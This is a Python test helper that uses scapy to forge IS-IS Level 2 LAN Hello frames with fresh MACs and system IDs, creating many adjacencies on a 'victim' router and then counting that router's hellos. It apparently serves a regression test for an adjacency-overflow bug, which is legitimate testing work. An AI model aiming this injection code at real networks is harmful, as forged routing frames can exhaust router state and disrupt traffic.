#!/usr/bin/env python3
# SPDX-License-Identifier: ISC
#
# iih_inject.py
#
"""Inject crafted IS-IS L2 LAN IIHs and count the victim's IIH on the wire.

Used by test_isis_iih_overflow.py.  Every injected frame carries a fresh
locally administered source MAC and a fresh system ID, and lists the
victim's SNPA in its LAN Neighbours TLV, so each frame creates one Up
adjacency on the victim.  The helper then keeps sniffing and reports how
many L2 IIHs the victim sent after the injection ended.
"""

import argparse
import json
import struct
import time

from scapy.all import AsyncSniffer, Ether, Raw, conf, sendp

conf.verb = 0

AREA_DEFAULT = bytes.fromhex("490001")


def tlv(t, value):
    return bytes([t, len(value)]) + value


def build_iih(sysid, holdtime, snpa_tlv=None, area=AREA_DEFAULT,
              protocols=b"\x01\xcc", ipv4=bytes([10, 0, 0, 99]),
              priority=0, dis=b"\x00" * 7):
    tlvs = b""
    if area is not None:
        tlvs += tlv(1, bytes([len(area)]) + area)
    if protocols is not None:
        tlvs += tlv(129, protocols)
    if ipv4 is not None:
        tlvs += tlv(132, ipv4)
    if snpa_tlv is not None:
        tlvs += tlv(6, snpa_tlv)
    hdr = (bytes([0x83, 27, 1, 6, 16, 1, 0, 0, 2])
           + sysid + struct.pack("!H", holdtime)
           + struct.pack("!H", 27 + len(tlvs))
           + bytes([priority]) + dis)
    return hdr + tlvs


def parse_isis(raw):
    if len(raw) < 20 or raw[14] != 0xFE or raw[15] != 0xFE or raw[16] != 0x03:
        return None
    pdu = raw[17:]
    if len(pdu) < 8 or pdu[0] != 0x83:
        return None
    return {"pdutype": pdu[4],
            "src_mac": ":".join("%02x" % b for b in raw[6:12])}


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--iface", required=True)
    parser.add_argument("--victim-mac", required=True)
    parser.add_argument("--sysid-base", default="02110000")
    parser.add_argument("--start-index", type=int, required=True)
    parser.add_argument("--count", type=int, required=True)
    parser.add_argument("--repeat", type=int, default=1,
                        help="send each frame this many times (dup control)")
    parser.add_argument("--holdtime", type=int, default=15)
    parser.add_argument("--rate", type=float, default=50.0,
                        help="injection rate in packets/s")
    parser.add_argument("--tail", type=float, default=8.0,
                        help="sniff seconds after the last injected frame")
    args = parser.parse_args()

    victim_mac = args.victim_mac.lower()
    spacing = 1.0 / args.rate
    sniffer = AsyncSniffer(iface=args.iface, filter="isis", store=True)
    sniffer.start()
    time.sleep(0.4)
    epoch = time.time()
    sent = 0
    for index in range(args.start_index, args.start_index + args.count):
        sysid = bytes.fromhex(args.sysid_base) + struct.pack("!H", index)
        src_mac = "02:11:00:00:%02x:%02x" % ((index >> 8) & 0xFF,
                                             index & 0xFF)
        pdu = build_iih(sysid, args.holdtime,
                        snpa_tlv=bytes.fromhex(victim_mac.replace(":", "")))
        llc = b"\xfe\xfe\x03" + pdu
        frame = Ether(dst="01:80:c2:00:00:15", src=src_mac,
                      type=len(llc)) / Raw(load=llc)
        for _ in range(args.repeat):
            if sent:
                time.sleep(spacing)
            sendp(frame, iface=args.iface, verbose=0)
            sent += 1
    last_sent = time.time() - epoch
    time.sleep(args.tail)
    packets = list(sniffer.stop() or [])

    victim_l2_after = 0
    victim_l2_total = 0
    total_isis = 0
    for pkt in packets:
        info = parse_isis(bytes(pkt))
        if info is None:
            continue
        total_isis += 1
        if info["src_mac"] != victim_mac or info["pdutype"] != 16:
            continue
        victim_l2_total += 1
        if float(pkt.time) - epoch > last_sent:
            victim_l2_after += 1

    print("IIH_INJECT_JSON=" + json.dumps({
        "sent": sent,
        "victim_l2_iih_after": victim_l2_after,
        "victim_l2_iih_total": victim_l2_total,
        "total_isis_frames": total_isis,
        "inject_seconds": round(last_sent, 3),
        "tail_seconds": args.tail,
    }, sort_keys=True))


if __name__ == "__main__":
    main()
